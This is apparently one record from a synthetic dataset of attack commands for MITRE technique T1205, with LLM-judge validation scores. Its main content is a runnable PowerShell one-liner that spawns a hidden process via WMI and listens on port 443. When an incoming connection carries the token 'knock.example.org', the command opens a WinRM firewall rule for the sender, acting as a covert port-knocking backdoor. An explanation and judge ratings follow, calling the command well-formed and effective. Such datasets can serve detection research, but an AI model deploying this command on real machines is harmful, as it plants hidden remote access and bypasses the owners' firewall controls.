{
  "technique_id": "T1205",
  "platform": "Windows",
  "shell": "PowerShell",
  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-WinRM-SNI'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-WinRM-SNI'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5986 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-SNI'' -Enabled False }; $l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any,443); $l.Start(); $c=$l.AcceptTcpClient(); $ns=$c.GetStream(); $buf=New-Object byte[] 4096; $n=$ns.Read($buf,0,$buf.Length); $s=[Text.Encoding]::ASCII.GetString($buf,0,$n); if($s -like ''*knock.example.org*''){ $src=$c.Client.RemoteEndPoint.Address.ToString(); Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-SNI'' -Enabled True -RemoteAddress $src }; $c.Close(); $l.Stop() }'",
  "explanation": "Accepts a TCP connection on 443 and inspects the initial ClientHello bytes for an SNI value containing 'knock.example.org' (TLS application signal in cleartext SNI). On match, it enables a WinRM HTTPS firewall rule for that client.",
  "rationale_steps": [
    "Create disabled inbound rule for TCP/5986.",
    "Start a TCP listener on 443 and read the first packet from the client.",
    "Search for the SNI hostname token and enable the rule for the client IP."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1205-5411a282-1ddefe58",
  "source_prompt_hash": "5411a282",
  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "PowerShell/WMI invocation is well-formed with balanced quotes/braces, valid parameters, proper separators, and correctly escaped single quotes inside the ArgumentList.",
        "semantic_score": 3,
        "semantic_justification": "It implements SNI-based signaling and attempts to toggle a WinRM firewall rule, but modifying firewall rules requires admin rights (conflicting with Privilege: None) and the single Read may miss SNI due to fragmentation, reducing likelihood of achieving the stated effect.",
        "combined_score": 4.0,
        "confidence": 0.85,
        "timestamp": "2025-10-01T17:21:21.369310Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, uses balanced quotes and parentheses, valid PowerShell syntax, and correctly escapes inner strings for WMI execution.",
        "semantic_score": 5,
        "semantic_justification": "The command precisely implements traffic signaling by listening on a common port (443), inspecting initial connection data for a specific string (mimicking SNI), and triggering a C2-relevant action (enabling WinRM firewall rule for the source IP) upon a match.",
        "combined_score": 5.0,
        "confidence": 1,
        "timestamp": "2025-10-01T17:21:38.035626Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, parentheses, and braces, correct PowerShell syntax for WMI method invocation, and proper nesting of the embedded script.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly implements the Traffic Signaling technique by creating a covert TCP listener that inspects incoming connections for a specific SNI value ('knock.example.org') and only enables a firewall rule for WinRM access from the signaling IP address when the correct 'knock' is received.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-02T03:20:39.215106Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 4.333,
    "llm_average_score": 4.667,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}